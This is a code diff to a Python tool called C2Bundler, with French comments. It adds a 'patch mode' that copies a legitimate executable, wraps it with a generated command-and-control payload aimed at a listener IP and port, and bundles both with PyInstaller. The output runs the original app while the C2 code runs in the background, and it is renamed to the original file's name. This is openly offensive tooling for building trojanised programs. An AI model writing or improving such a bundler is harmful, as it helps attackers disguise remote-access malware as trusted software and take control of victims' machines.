@@ -51,7 +51,7 @@ class C2Bundler:
         return temp_file
 
     def bundle_with_pyinstaller(
-        self, temp_file: str, platform: str = "windows"
+        self, temp_file: str, platform: str = "windows", add_resources: bool = False
     ) -> bool:
         """Exécute PyInstaller pour créer l'executable"""
         print(f"[*] Running PyInstaller (this may take 30-60 seconds)...")
@@ -74,6 +74,15 @@ class C2Bundler:
         # Platform-specific options
         if platform == "windows":
             cmd.extend(["--windowed"])
+
+        # Add resources folder if patch mode
+        if add_resources and self.resources_dir.exists():
+            resources_files = list(self.resources_dir.glob("*"))
+            if resources_files:
+                for res_file in resources_files:
+                    if res_file.is_file():
+                        cmd.extend(["--add-data", f"{res_file}:resources"])
+                        print(f"[*] Adding resource: {res_file.name}")
 
         cmd.append(temp_file)
 
@@ -154,39 +163,44 @@ class C2Bundler:
         """Crée un payload qui exécute le fichier original + C2 en arrière-plan"""
         try:
             print(f"[*] PATCH MODE: Creating wrapper for {Path(target_file).name}")
-            
+
             # Vérifier que le fichier existe
             target_path = Path(target_file)
             if not target_path.exists():
                 print(f"[!] Target file not found: {target_file}")
                 return False
-            
+
             # Copier le fichier original dans resources
             original_file = self.resources_dir / target_path.name
             print(f"[*] Copying original file to: {original_file}")
             import shutil
+
             shutil.copy2(target_file, original_file)
-            print(f"[+] Original file saved ({original_file.stat().st_size / 1024:.2f} KB)")
-            
+            print(
+                f"[+] Original file saved ({original_file.stat().st_size / 1024:.2f} KB)"
+            )
+
             # Générer le payload C2
             payload_code = self.generate_payload(
                 listener_ip, listener_port, obfuscation_level
             )
-            
+
             # Créer le wrapper qui lance original + C2
             wrapper_code = self._create_wrapper_code(
                 original_file.name, payload_code, platform
             )
-            
+
             # Sauvegarder le wrapper
             temp_file = self.save_payload(wrapper_code)
-            
-            # Bundle avec PyInstaller
+
+            # Bundle avec PyInstaller (avec resources)
             print(f"[*] Bundling patched payload...")
-            if not self.bundle_with_pyinstaller(temp_file, platform):
+            if not self.bundle_with_pyinstaller(
+                temp_file, platform, add_resources=True
+            ):
                 print("[!] FAILED: PyInstaller bundling failed")
                 return False
-            
+
             # Renommer l'exe final avec le nom original
             output_name = "c2_payload"
             if platform == "windows":
@@ -197,7 +211,7 @@ class C2Bundler:
             else:
                 source = self.dist_dir / output_name
                 dest = self.dist_dir / target_path.stem
-            
+
             if source.exists():
                 if dest.exists():
                     dest.unlink()
@@ -211,21 +225,22 @@ class C2Bundler:
             else:
                 print(f"[!] Executable not found")
                 return False
-                
+
         except Exception as e:
             print(f"[!] FAILED: {str(e)}")
             import traceback
+
             print(traceback.format_exc())
             return False
-    
+
     def _create_wrapper_code(
         self, original_filename: str, payload_code: str, platform: str
     ) -> str:
         """Crée le code wrapper qui lance l'original + C2"""
-        
+
         # Extraire juste le code C2 (sans les imports dupliqués)
         # Le payload_code contient déjà tout le code nécessaire
-        
+
         wrapper = f'''
 import os
 import sys
@@ -278,7 +293,7 @@ if __name__ == "__main__":
     # Attendre que l'app originale termine
     original_thread.join()
 '''
-        
+
         return wrapper
 
     def create_bundled_payload(
@@ -296,7 +311,7 @@ if __name__ == "__main__":
                 return self.create_patched_payload(
                     listener_ip, listener_port, obfuscation_level, platform, patch_file
                 )
-            
+
             # Sinon, mode standalone normal
             # Step 1: Generate payload
             payload_code = self.generate_payload(
